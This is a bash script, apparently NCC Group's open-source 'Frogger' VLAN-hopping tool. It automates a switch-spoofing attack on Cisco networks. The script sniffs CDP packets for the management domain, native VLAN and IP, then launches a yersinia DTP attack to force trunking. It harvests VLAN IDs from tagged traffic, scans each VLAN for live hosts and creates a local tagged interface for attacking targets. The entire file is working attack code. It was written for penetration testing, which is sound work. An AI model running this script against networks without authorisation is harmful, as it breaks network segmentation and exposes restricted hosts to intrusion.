#!/usr/bin/env bash
# Frogger - The VLAN Hopper script
# Daniel Compton
# www.commonexploits.com
# contact@commexploits.com
# Twitter = @commonexploits
# 28/11/2012
# Requires arp-scan >= 1.8 for VLAN tagging, yersinia, tshark and screen
# Tested on Bactrack 5 with Cisco devices - it can be used over SSH
# 1.4 changes - Speed improvements on CDP scanning made by Bernardo Damele.


#####################################################################################
# Released as open source by NCC Group Plc - http://www.nccgroup.com/

# Developed by Daniel Compton, daniel dot compton at nccgroup dot com

# https://github.com/nccgroup/vlan-hopping

#Released under AGPL see LICENSE for more information

######################################################################################

# User configuration Settings
TAGSEC="90" #change this value for the number of seconds to sniff for 802.1Q tagged packets
CDPSEC="90" # change this value for the number of seconds to sniff for CDP packets
DTPWAIT="20" # amount of time to wait for DTP attack via yersinia to trigger

# Variables needed throughout execution, do not touch
MANDOM=""
NATID=""
DEVID=""
MANIP=""

# Script starts

VERSION="1.5"

ARPVER="`arp-scan -V 2>&1 | grep \"arp-scan [0-9]\" | cut -f 2 -d\" \"`"
clear
echo -e "\e[00;32m########################################################\e[00m"
echo "***   Frogger - The VLAN Hopper Version $VERSION  ***"
echo "***   Auto enumerates VLANs and Discovers devices ***"
echo -e "\e[00;32m########################################################\e[00m"
echo ""
echo -e "\e[00;34m-------------------------------------------\e[00m"
echo "Checking dependencies"
echo -e "\e[00;34m-------------------------------------------\e[00m"

#Check for yersinia
which yersinia >/dev/null
if [ $? -eq 0 ]
then
	echo ""
    echo -e "\e[00;32mI have found the required Yersinia program\e[00m"
else
	echo ""
    echo -e "\e[00;31mUnable to find the required Yersinia program, install and try again\e[00m"
    exit 1
fi

#Check for tshark
which tshark >/dev/null
if [ $? -eq 0 ]
then
	echo ""
	echo -e "\e[00;32mI have found the required tshark program\e[00m"
else
	echo ""
	echo -e "\e[00;31mUnable to find the required tshark program, install and try again\e[00m"
	echo ""
    exit 1
fi

#Check for screen
which screen >/dev/null
if [ $? -eq 0 ]
then
	echo ""
	echo -e "\e[00;32mI have found the required screen program\e[00m"
else
	echo ""
	echo -e "\e[00;31mUnable to find the required screen program, install and try again\e[00m"
	echo ""
    exit 1
fi

#Check for arpscan
which arp-scan >/dev/null
if [ $? -eq 1 ]
then
	echo -e "\e[00;31mUnable to find the required arp-scan program, install at least version 1.8 and try again. Download from www.nta-monitor.com\e[00m"
	echo ""
    exit 1
else
	compare_arpscan="`echo "$ARPVER < 1.8" | bc`"
	if [ $compare_arpscan -eq 1 ]; then
		echo ""
		echo -e "\e[00;31mUnable to find version 1.8 of arp-scan, 1.8 is required for VLAN tagging. Install at least version 1.8 and try again. Download from www.nta-monitor.com\e[00m"
		exit 1
	else
		echo ""
		echo -e "\e[00;32mI have found the required version of arp-scan\e[00m"

	fi
fi

echo ""
echo "----------------------------------- Settings -------------------------------------"
echo ""
echo -e "Sniffer settings for CDP are set to \e[00;32m$CDPSEC\e[00m seconds"
echo ""
echo -e "Sniffer settings for tagged packets are set to \e[00;32m$TAGSEC\e[00m seconds"
echo ""
echo "----------------------------------------------------------------------------------"
echo -e " Press ENTER to continue or CTRL-C to cancel... \c"
read enterkey
clear

echo -e "\e[1;33m----------------------------------------\e[00m"
echo "The following Interfaces are available"
echo -e "\e[1;33m----------------------------------------\e[00m"
ifconfig | grep -o "eth.*" |cut -d " " -f1
echo -e "\e[1;31m--------------------------------------------------\e[00m"
echo "Enter the interface to scan from as the source"
echo -e "\e[1;31m--------------------------------------------------\e[00m"
read INT
ifconfig | grep -i -w $INT >/dev/null

if [ $? = 1 ]
	then
		echo ""
		echo -e "\e[1;31mSorry the interface you entered does not exist! - check and try again.\e[00m"
		echo ""
		exit 1
else
echo ""
fi
clear
echo ""
echo -e "\e[1;33mNow Sniffing CDP Packets on $INT - Please wait for "$CDPSEC" seconds...\e[00m"
echo ""

OUTPUT="`tshark -a duration:$CDPSEC -i $INT -R \"cdp\" -V 2>&1 | sort --unique`"
printf -- "${OUTPUT}\n" | while read line
do
	case "${line}" in
		VTP\ Management\ Domain:*)
            if [ -n "$MANDOM" ]
            then
                continue
            fi
			MANDOM="`printf -- \"${line}\n\" | cut -f2 -d\":\"`"
			if [ "$MANDOM" = "Domain:" ]
			then
				echo -e "\e[1;33mThe VTP domain appears to be set to NULL on the device. Script will continue..\e[00m"
				echo ""
				echo -e "\e[1;33mPress the Enter key to continue\e[00m"
				read enterkey
			elif [ -z "$MANDOM" ]
			then
				echo -e "\e[1;33mI didn't find any VTP management domain within CDP packets. Possibly CDP is not enabled. Script will continue..\e[00m"
				echo ""
				echo -e "\e[1;33mPress the Enter key to continue\e[00m"
				read enterkey
			else
				
				echo -e "\e[1;33m----------------------------------------------------------\e[00m"
				echo "The following Management domains were found"
				echo -e "\e[1;33m----------------------------------------------------------\e[00m"
				echo -e "\e[00;32m$MANDOM\e[00m"
				echo ""			
			fi
			;;
		Native\ VLAN:*)
            if [ -n "$NATID" ]
            then
                continue
            fi
			NATID="`printf -- \"${line}\n\" | cut -f2 -d\":\"`"
			if [ -z "$NATID" ]
			then
				echo -e "\e[1;33mI didn't find any Native VLAN ID within CDP packets. Perhaps CDP is not enabled.\e[00m"
				echo ""
				echo -e "\e[1;33mPress the Enter key to continue\e[00m"
				read enterkey
			else
				
				echo -e "\e[1;33m------------------------------------------------\e[00m"
				echo "The following Native VLAN ID was found"
				echo -e "\e[1;33m------------------------------------------------\e[00m"
				echo -e "\e[00;32m$NATID\e[00m"
				echo ""
			fi
			
			;;
		*RELEASE\ SOFTWARE*)
            if [ -n "$DEVID" ]
            then
                continue
            fi
			DEVID="`printf -- \"${line}\n\" | awk '{sub(/^[ \t]+/, ""); print}'`"
			if [ -z "$DEVID" ]
			then
				echo -e "\e[1;33mI didn't find any devices. Perhaps it is not a Cisco device.\e[00m"
				echo ""
				echo -e "\e[1;33mPress the Enter key to continue\e[00m"
				read enterkey
			else
				
				echo -e "\e[1;33m------------------------------------------------\e[00m"
				echo "The following Cisco device was found"
				echo -e "\e[1;33m------------------------------------------------\e[00m"
				echo -e "\e[00;32m$DEVID\e[00m"
				echo ""
				
			fi
			
			;;
		IP\ address:*)
            if [ -n "$MANIP" ]
            then
                continue
            fi
			MANIP="`printf -- \"${line}\n\" | cut -f2 -d\":\"`"
			if [ -z "$MANIP" ]
			then
				echo -e "\e[00;31mI didn't find any management addresses within CDP packets. Try increasing the CDP time and try again!\e[00m"
				exit
			else
				
				echo -e "\e[1;33m---------------------------------------------------\e[00m"
				echo "The following Management IP Addresses were found"
				echo -e "\e[1;33m---------------------------------------------------\e[00m"
				echo -e "\e[00;32m$MANIP\e[00m"
				echo $MANIP >MANIPTMP
				echo ""
			fi
			
			;;
	esac
done

echo ""
echo -e "\e[1;33mNow Running DTP Attack on interface $INT, waiting "$DTPWAIT" seconds to trigger\e[00m"
echo ""
screen -d -m -S yersina_dtp yersinia dtp -attack 1 -interface $INT
sleep $DTPWAIT
#clear

echo ""
echo -e "\e[1;33mNow Extracting VLAN IDs on interface $INT, sniffing 802.1Q tagged packets for "$TAGSEC" seconds...\e[00m"
echo ""

VLANIDS=`tshark -a duration:$TAGSEC -i $INT -R "vlan" -x -V 2>&1 |grep -o " = ID: .*" |awk '{ print $NF }' | sort --unique`
#clear

if [ -z "$VLANIDS" ]
then
	echo -e "\e[00;31mI didn't find any VLAN IDs within 802.1Q tagged packets. Try increasing the tagged time (TAGSEC) and try again!\e[00m"
	exit 1
else
	echo -e "\e[1;33m------------------------------------\e[00m"
	echo "The following VLAN IDs were found"
	echo -e "\e[1;33m------------------------------------\e[00m"
	echo -e "\e[00;32m$VLANIDS\e[00m"
	echo -e "\e[1;33m------------------------------------\e[00m"
	echo ""
	echo -e "Press ENTER to continue and scan VLANs for live devices"
fi
read enterkey
clear

SCANSDTP=$(cat MANIPTMP |cut -d "." -f 1,2,3)
echo -e "\e[1;31m------------------------------------------------------------------------------------------\e[00m"
echo "Enter the IP address or CIDR range you wish to scan i.e 192.168.1.1 or 192.168.1.0/24"
echo ""
echo "Looking at the management address, try to scan "$SCANSDTP".0/24"
echo -e "\e[1;31m------------------------------------------------------------------------------------------\e[00m"
read IPADDRESS

rm MANIPTMP 2>&1 >/dev/null
clear
for VLANIDSCAN in $(echo "$VLANIDS") 
do
	echo -e "\e[1;33m---------------------------------------------------------------------------\e[00m"
	echo -e "Now scanning \e[00;32m$IPADDRESS - VLAN $VLANIDSCAN\e[00m for live devices"
	echo -e "\e[1;33m---------------------------------------------------------------------------\e[00m"
	arp-scan -Q $VLANIDSCAN -I $INT $IPADDRESS -t 500 2>&1 |grep "802.1Q VLAN="
	if [ $? = 0 ]
	then
		echo -e "\e[00;32mDevices were found in VLAN "$VLANIDSCAN"\e[00m"
	else
		echo -e "\e[01;31mNo devices found in VLAN "$VLANIDSCAN"\e[00m"
	fi
done

#Menu choice for creating VLAN interface
echo ""
echo -e "\e[1;31m------------------------------------------------------------------------------------------\e[00m"
showMenu () {
	echo "1) Select 1 to create a new local VLAN Interface for attacking the target"
	echo "2) Select 2 to exit script - this will kill all processes"
	echo -e "\e[1;31m------------------------------------------------------------------------------------------\e[00m"
}

while [ 1 ]
do
	showMenu
	read CHOICE
	case "$CHOICE" in
		"1")
			echo -e "\e[1;31m-------------------------------------------------------------------------------------------------------------------------\e[00m"
			echo  "Enter the VLAN ID to Create"
			echo -e "\e[1;31m-------------------------------------------------------------------------------------------------------------------------\e[00m"
			read VID
			echo -e "\e[1;31m-------------------------------------------------------------------------------------------------------------------------\e[00m"
			echo "Enter the IP address you wish to assign to the new VLAN interface $VID i.e 192.168.1.100/24"
			echo -e "\e[1;31m-------------------------------------------------------------------------------------------------------------------------\e[00m"
			read VIP
			modprobe 8021q
			vconfig add $INT $VID
			ifconfig $INT.$VID up
			ifconfig $INT.$VID $VIP
			echo -e "\e[1;32m--------------------------------------------------------------------------------------------------\e[00m"
			echo "The following interface is now configured locally"
			echo "#################################################################################################"
			echo -e "Interface \e[1;32m$INT.$VID\e[00m with IP Address \e[1;32m$VIP\e[00m"
			echo "#################################################################################################"
			echo -e "\e[1;32m----------------------------------------------------------------------------------------------------\e[00m"
			;;
		"2")
			ps -ef | grep "[Yy]ersinia dtp" >/dev/null
			if [ $? = 0 ]
			then
				killall yersinia
				echo -e "\e[1;32mDTP attack has been stopped\e[00m"
				exit 1
			else
				exit 1
			fi
			;;
	esac
done
#END
